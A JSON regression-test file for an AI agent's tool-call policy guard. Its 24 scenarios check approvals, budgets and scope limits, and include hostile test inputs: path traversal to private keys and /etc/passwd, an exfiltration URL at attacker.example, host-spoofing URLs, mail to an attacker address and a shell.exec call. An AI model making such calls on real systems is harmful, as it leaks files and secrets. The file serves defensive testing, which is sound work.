@@ -1,0 +1,499 @@
+{
+  "name": "agent-sentry-policy-regressions-v1",
+  "provenance": "24 handcrafted deterministic scenarios, not an independent model benchmark",
+  "policy": {
+    "name": "research-assistant",
+    "max_calls": 5,
+    "max_units": 8,
+    "tools": {
+      "file.read": {
+        "units": 1,
+        "approval": false,
+        "roots": [
+          "workspace"
+        ]
+      },
+      "file.write": {
+        "units": 2,
+        "approval": true,
+        "roots": [
+          "workspace"
+        ]
+      },
+      "http.get": {
+        "units": 2,
+        "approval": false,
+        "hosts": [
+          "docs.example.org"
+        ]
+      },
+      "mail.send": {
+        "units": 3,
+        "approval": true,
+        "recipients": [
+          "reviewer@example.test"
+        ]
+      }
+    }
+  },
+  "cases": [
+    {
+      "id": "benign-read",
+      "category": "utility",
+      "steps": [
+        {
+          "tool": "file.read",
+          "arguments": {
+            "path": "workspace/brief.md"
+          },
+          "expect": "allowed"
+        }
+      ]
+    },
+    {
+      "id": "benign-https",
+      "category": "utility",
+      "steps": [
+        {
+          "tool": "http.get",
+          "arguments": {
+            "url": "https://docs.example.org/guide"
+          },
+          "expect": "allowed"
+        }
+      ]
+    },
+    {
+      "id": "parent-traversal",
+      "category": "resource-scope",
+      "steps": [
+        {
+          "tool": "file.read",
+          "arguments": {
+            "path": "workspace/../private/key"
+          },
+          "expect": "invalid_path"
+        }
+      ]
+    },
+    {
+      "id": "absolute-path",
+      "category": "resource-scope",
+      "steps": [
+        {
+          "tool": "file.read",
+          "arguments": {
+            "path": "/etc/passwd"
+          },
+          "expect": "invalid_path"
+        }
+      ]
+    },
+    {
+      "id": "windows-path",
+      "category": "resource-scope",
+      "steps": [
+        {
+          "tool": "file.read",
+          "arguments": {
+            "path": "C:\\private\\key"
+          },
+          "expect": "invalid_path"
+        }
+      ]
+    },
+    {
+      "id": "encoded-traversal",
+      "category": "resource-scope",
+      "steps": [
+        {
+          "tool": "file.read",
+          "arguments": {
+            "path": "workspace/%2e%2e/private"
+          },
+          "expect": "invalid_path"
+        }
+      ]
+    },
+    {
+      "id": "root-prefix-collision",
+      "category": "resource-scope",
+      "steps": [
+        {
+          "tool": "file.read",
+          "arguments": {
+            "path": "workspace-backup/key"
+          },
+          "expect": "path_outside_scope"
+        }
+      ]
+    },
+    {
+      "id": "outside-root",
+      "category": "resource-scope",
+      "steps": [
+        {
+          "tool": "file.read",
+          "arguments": {
+            "path": "private/key"
+          },
+          "expect": "path_outside_scope"
+        }
+      ]
+    },
+    {
+      "id": "exfiltration-host",
+      "category": "network-scope",
+      "steps": [
+        {
+          "tool": "http.get",
+          "arguments": {
+            "url": "https://attacker.example/collect"
+          },
+          "expect": "host_outside_scope"
+        }
+      ]
+    },
+    {
+      "id": "hostname-suffix",
+      "category": "network-scope",
+      "steps": [
+        {
+          "tool": "http.get",
+          "arguments": {
+            "url": "https://docs.example.org.evil.test/a"
+          },
+          "expect": "host_outside_scope"
+        }
+      ]
+    },
+    {
+      "id": "userinfo-url",
+      "category": "network-scope",
+      "steps": [
+        {
+          "tool": "http.get",
+          "arguments": {
+            "url": "https://docs.example.org@evil.test/a"
+          },
+          "expect": "invalid_url"
+        }
+      ]
+    },
+    {
+      "id": "plaintext-http",
+      "category": "network-scope",
+      "steps": [
+        {
+          "tool": "http.get",
+          "arguments": {
+            "url": "http://docs.example.org/a"
+          },
+          "expect": "invalid_url"
+        }
+      ]
+    },
+    {
+      "id": "alternate-port",
+      "category": "network-scope",
+      "steps": [
+        {
+          "tool": "http.get",
+          "arguments": {
+            "url": "https://docs.example.org:444/a"
+          },
+          "expect": "invalid_url"
+        }
+      ]
+    },
+    {
+      "id": "unknown-tool",
+      "category": "authority",
+      "steps": [
+        {
+          "tool": "shell.exec",
+          "arguments": {
+            "command": "synthetic-command"
+          },
+          "expect": "unknown_tool"
+        }
+      ]
+    },
+    {
+      "id": "client-cost-override",
+      "category": "authority",
+      "steps": [
+        {
+          "tool": "file.read",
+          "arguments": {
+            "path": "workspace/a",
+            "units": 0
+          },
+          "expect": "invalid_arguments"
+        }
+      ]
+    },
+    {
+      "id": "write-needs-approval",
+      "category": "approval",
+      "steps": [
+        {
+          "tool": "file.write",
+          "arguments": {
+            "path": "workspace/report.md",
+            "content": "synthetic report"
+          },
+          "expect": "approval_required"
+        }
+      ]
+    },
+    {
+      "id": "approved-write",
+      "category": "utility",
+      "steps": [
+        {
+          "approve": {
+            "tool": "file.write",
+            "arguments": {
+              "path": "workspace/report.md",
+              "content": "synthetic report"
+            }
+          },
+          "as": "grant"
+        },
+        {
+          "tool": "file.write",
+          "arguments": {
+            "path": "workspace/report.md",
+            "content": "synthetic report"
+          },
+          "expect": "allowed",
+          "approval": "grant"
+        }
+      ]
+    },
+    {
+      "id": "approval-argument-swap",
+      "category": "approval",
+      "steps": [
+        {
+          "approve": {
+            "tool": "file.write",
+            "arguments": {
+              "path": "workspace/report.md",
+              "content": "synthetic report"
+            }
+          },
+          "as": "grant"
+        },
+        {
+          "tool": "file.write",
+          "arguments": {
+            "path": "workspace/report.md",
+            "content": "changed"
+          },
+          "expect": "approval_mismatch",
+          "approval": "grant"
+        },
+        {
+          "tool": "file.write",
+          "arguments": {
+            "path": "workspace/report.md",
+            "content": "synthetic report"
+          },
+          "expect": "allowed",
+          "approval": "grant"
+        }
+      ]
+    },
+    {
+      "id": "approval-reuse",
+      "category": "approval",
+      "steps": [
+        {
+          "approve": {
+            "tool": "file.write",
+            "arguments": {
+              "path": "workspace/report.md",
+              "content": "synthetic report"
+            }
+          },
+          "as": "grant"
+        },
+        {
+          "tool": "file.write",
+          "arguments": {
+            "path": "workspace/report.md",
+            "content": "synthetic report"
+          },
+          "expect": "allowed",
+          "approval": "grant"
+        },
+        {
+          "tool": "file.write",
+          "arguments": {
+            "path": "workspace/report.md",
+            "content": "synthetic report"
+          },
+          "expect": "approval_used",
+          "approval": "grant"
+        }
+      ]
+    },
+    {
+      "id": "approval-expiry",
+      "category": "approval",
+      "steps": [
+        {
+          "approve": {
+            "tool": "file.write",
+            "arguments": {
+              "path": "workspace/report.md",
+              "content": "synthetic report"
+            }
+          },
+          "as": "grant",
+          "ttl": 10
+        },
+        {
+          "advance": 10
+        },
+        {
+          "tool": "file.write",
+          "arguments": {
+            "path": "workspace/report.md",
+            "content": "synthetic report"
+          },
+          "expect": "approval_expired",
+          "approval": "grant"
+        }
+      ]
+    },
+    {
+      "id": "call-budget",
+      "category": "budget",
+      "steps": [
+        {
+          "tool": "file.read",
+          "arguments": {
+            "path": "workspace/a"
+          },
+          "expect": "allowed"
+        },
+        {
+          "tool": "file.read",
+          "arguments": {
+            "path": "workspace/a"
+          },
+          "expect": "allowed"
+        },
+        {
+          "tool": "file.read",
+          "arguments": {
+            "path": "workspace/a"
+          },
+          "expect": "allowed"
+        },
+        {
+          "tool": "file.read",
+          "arguments": {
+            "path": "workspace/a"
+          },
+          "expect": "allowed"
+        },
+        {
+          "tool": "file.read",
+          "arguments": {
+            "path": "workspace/a"
+          },
+          "expect": "allowed"
+        },
+        {
+          "tool": "file.read",
+          "arguments": {
+            "path": "workspace/a"
+          },
+          "expect": "budget_exceeded"
+        }
+      ]
+    },
+    {
+      "id": "unit-budget",
+      "category": "budget",
+      "steps": [
+        {
+          "tool": "http.get",
+          "arguments": {
+            "url": "https://docs.example.org/a"
+          },
+          "expect": "allowed"
+        },
+        {
+          "tool": "http.get",
+          "arguments": {
+            "url": "https://docs.example.org/a"
+          },
+          "expect": "allowed"
+        },
+        {
+          "tool": "http.get",
+          "arguments": {
+            "url": "https://docs.example.org/a"
+          },
+          "expect": "allowed"
+        },
+        {
+          "tool": "http.get",
+          "arguments": {
+            "url": "https://docs.example.org/a"
+          },
+          "expect": "allowed"
+        },
+        {
+          "tool": "file.read",
+          "arguments": {
+            "path": "workspace/a"
+          },
+          "expect": "budget_exceeded"
+        }
+      ]
+    },
+    {
+      "id": "idempotent-retry",
+      "category": "reliability",
+      "steps": [
+        {
+          "tool": "file.read",
+          "arguments": {
+            "path": "workspace/a"
+          },
+          "expect": "allowed",
+          "request_id": "retry"
+        },
+        {
+          "tool": "file.read",
+          "arguments": {
+            "path": "workspace/a"
+          },
+          "expect": "allowed",
+          "request_id": "retry"
+        }
+      ]
+    },
+    {
+      "id": "recipient-exfiltration",
+      "category": "resource-scope",
+      "steps": [
+        {
+          "tool": "mail.send",
+          "arguments": {
+            "to": "attacker@example.test",
+            "subject": "Synthetic",
+            "body": "Synthetic"
+          },
+          "expect": "recipient_outside_scope"
+        }
+      ]
+    }
+  ]
+}
